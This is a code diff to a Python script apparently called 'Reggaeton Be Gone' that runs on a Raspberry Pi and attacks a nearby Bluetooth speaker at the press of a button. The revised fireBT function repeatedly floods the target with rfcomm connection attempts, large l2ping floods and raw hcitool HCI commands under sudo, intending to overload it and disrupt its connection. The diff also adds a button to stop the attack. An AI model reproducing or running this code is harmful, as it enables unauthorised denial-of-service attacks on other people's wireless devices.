@@ -38,13 +38,14 @@ GPIO.setmode(GPIO.BCM)
 GPIO.setup(buttonPin, GPIO.IN, pull_up_down=GPIO.PUD_UP)
 
 # Configuración del ataque Bluetooth
-myPath = "/home/pi/reggaeton/"
-method = 1  # Método de ataque
+myPath = "/home/user/music_be_gone/"
+method = 3  # Método de ataque
 targetAddr = ":::::"  # Dirección del dispositivo de destino
 packagesSize = 800
 threadsCount = 1000
 myDelay = 0.1
 forceFire = 0
+attack_running = False  # Estado del ataque
 
 def writeLog(myLine):
     now = datetime.datetime.now()
@@ -63,30 +64,58 @@ def updateScreen(message1, message2):
     disp.display(image)
 
 def fireBT(method, targetAddr, threadsCount, packagesSize, myDelay):
+    global attack_running
     writeLog("Firing with method #" + str(method) + ", pkg " + str(packagesSize) + ', target ' + targetAddr)
-    if method == 1:
-        for i in range(threadsCount):
-            print('[*] ' + str(i + 1))
-            subprocess.call(['rfcomm', 'connect', targetAddr, '1'])
-            time.sleep(myDelay)
-    elif method == 2:
-        for i in range(threadsCount):
-            print('[*] ' + str(i + 1))
-            os.system('l2ping -i hci0 -s ' + str(packagesSize) + ' -f ' + targetAddr)
-            time.sleep(myDelay)
-    elif method == 3:
-        for i in range(threadsCount):
-            print('[*] Sorry, Scarface method is not included in this version ' + str(i + 1))
-            time.sleep(myDelay)
+    
+    for i in range(threadsCount):
+        # Verificar si se presiona el botón para detener el ataque
+        if GPIO.input(buttonPin) == GPIO.LOW:
+            attack_running = False
+            print("Attack stopped by button press.")
+            break
+        
+        print(f'[*] Heavy Interference Attempt {i + 1}/{threadsCount}')
+        
+        try:
+            # Intentar conectarse repetidamente usando rfcomm
+            subprocess.call(['sudo', 'rfcomm', 'connect', 'hci0', targetAddr, '1'], timeout=5)
+        except subprocess.TimeoutExpired:
+            print("RFCOMM connection attempt timed out.")
+
+        # Enviar pings grandes al dispositivo para sobrecargarlo
+        try:
+            subprocess.call(['sudo', 'l2ping', '-i', 'hci0', '-s', str(packagesSize), '-f', targetAddr])
+        except Exception as e:
+            print(f'Error during l2ping: {e}')
+        
+        # Enviar comando HCI para intentar desestabilizar la conexión
+        try:
+            subprocess.call(['sudo', 'hcitool', '-i', 'hci0', 'cmd', '0x08', '0x0008', '00'])
+        except Exception as e:
+            print(f'Error during hcitool command: {e}')
+        
+        time.sleep(myDelay)
 
 def signal_handler(sig, frame):
+    global attack_running
     print('Interrupted')
+    attack_running = False
     writeLog("Interrupted")
     sys.exit(0)
 
 signal.signal(signal.SIGINT, signal_handler)
 
+def button_pressed():
+    # Función para verificar si el botón ha sido presionado con debouncing
+    if GPIO.input(buttonPin) == GPIO.LOW:
+        time.sleep(0.05)  # Pequeño retardo para el debouncing
+        if GPIO.input(buttonPin) == GPIO.LOW:  # Verificar de nuevo después del retardo
+            return True
+    return False
+
 def main(argv):
+    global attack_running
+    
     print("")
     print("Reggaeton Be Gone 1.0 (Sin IA)")
     print("@RoniBandini, February 2024")
@@ -96,23 +125,36 @@ def main(argv):
 
     writeLog("Started")
 
-    # Display
+    # Mostrar pantalla inicial
     updateScreen(targetAddr, "Method #" + str(method))
     time.sleep(3)
 
-    # Esperar a que se presione el botón
-    while GPIO.input(buttonPin) == GPIO.HIGH:
-        time.sleep(1)
+    while True:
+        if button_pressed():  # Verificar si el botón ha sido presionado
+            if not attack_running:
+                writeLog("Button pressed, starting attack")
+                updateScreen("Firing speaker", "")
+                print("Firing...")
+                attack_running = True
 
-    writeLog("Button pressed, firing")
-    updateScreen("Firing speaker", "")
-    print("Firing...")
+                # Ejecutar el ataque
+                fireBT(method, targetAddr, threadsCount, packagesSize, myDelay)
+                
+                # Volver a mostrar la pantalla inicial después del ataque
+                updateScreen(targetAddr, "Method #" + str(method))
+            else:
+                writeLog("Button pressed, stopping attack")
+                print("Attack stopped.")
+                attack_running = False
 
-    # Mostrar el logo y ejecutar el ataque
-    image = Image.open(myPath + 'images/logo.png').convert('1')
-    disp.display(image)
+                # Volver a mostrar la pantalla inicial inmediatamente después de detener el ataque
+                updateScreen(targetAddr, "Method #" + str(method))
 
-    fireBT(method, targetAddr, threadsCount, packagesSize, myDelay)
+            # Esperar a que se suelte el botón para evitar múltiples activaciones
+            while GPIO.input(buttonPin) == GPIO.LOW:
+                time.sleep(0.1)
+            
+        time.sleep(0.1)
 
 if __name__ == '__main__':
     main(sys.argv[1:])
